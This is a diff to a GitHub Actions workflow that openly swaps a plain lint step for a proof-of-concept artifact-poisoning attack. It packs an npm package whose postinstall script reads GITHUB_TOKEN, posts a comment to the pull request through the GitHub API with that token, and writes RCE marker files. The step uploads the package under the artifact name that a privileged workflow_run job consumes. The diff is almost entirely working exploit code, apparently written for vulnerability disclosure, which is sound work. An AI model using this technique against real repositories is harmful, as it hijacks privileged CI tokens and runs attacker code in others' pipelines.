@@ -7,15 +7,43 @@ jobs:
   validate:
     runs-on: ubuntu-latest
     steps:
-      - name: Lint report
+      - name: Build attacker-controlled linter-report artifact
         run: |
-          echo "legit lint report" > linter-report.txt
-          echo "${{ github.event.pull_request.number }}" > pr-number.txt
-      - name: Upload linter report
-        uses: actions/upload-artifact@v7
+          mkdir -p payload/pkg
+          cat > payload/pkg/package.json <<'JSON'
+          {"name":"lint-util","version":"1.0.0","scripts":{"postinstall":"node post.js"}}
+          JSON
+          cat > payload/pkg/post.js <<'JS'
+          const fs = require('fs');
+          const { execSync } = require('child_process');
+          const root = process.env.INIT_CWD || process.cwd();
+          const token = process.env.GITHUB_TOKEN || '';
+          const lines = ['GAB_RCE_PWNED uid=' + process.getuid() + ' cwd=' + root, 'token_len=' + token.length];
+          try {
+            const n = fs.readFileSync(root + '/pr-number.txt', 'utf8').trim();
+            fs.writeFileSync('/tmp/gab-body.json', JSON.stringify({ body: 'GAB PoC: attacker-controlled package.json lifecycle ran inside the privileged workflow_run; this comment was created with the privileged GITHUB_TOKEN.' }));
+            const out = execSync('curl -s -o /dev/null -w %{http_code} -X POST -H "authorization: Bearer ' + token + '" -H "accept: application/vnd.github+json" -H "content-type: application/json" -d @/tmp/gab-body.json https://api.github.com/repos/' + process.env.GITHUB_REPOSITORY + '/issues/' + n + '/comments').toString();
+            lines.push('comment_status=' + out);
+          } catch (e) { lines.push('comment_err=' + e.message); }
+          fs.writeFileSync('/tmp/ADP_ARTIFACT_RCE', lines.join('\n'));
+          fs.writeFileSync('/tmp/ADP_RCE_MARKER', 'pwned');
+          console.log(lines.join('\n'));
+          JS
+          (cd payload/pkg && npm pack --silent >/dev/null)
+          mv payload/pkg/lint-util-1.0.0.tgz payload/
+          printf 'attacker linter report body\n' > payload/linter-report.txt
+          echo "${{ github.event.pull_request.number }}" > payload/pr-number.txt
+          cat > payload/package.json <<'JSON'
+          {"name":"poc-root","version":"1.0.0","private":true,"dependencies":{"lint-util":"file:./lint-util-1.0.0.tgz"}}
+          JSON
+          ls -la payload
+      - name: Upload artifact with the exact name the privileged workflow consumes
+        uses: actions/upload-artifact@v4
         with:
           name: linter-report
           path: |
-            linter-report.txt
-            pr-number.txt
+            payload/package.json
+            payload/lint-util-1.0.0.tgz
+            payload/linter-report.txt
+            payload/pr-number.txt
           if-no-files-found: ignore
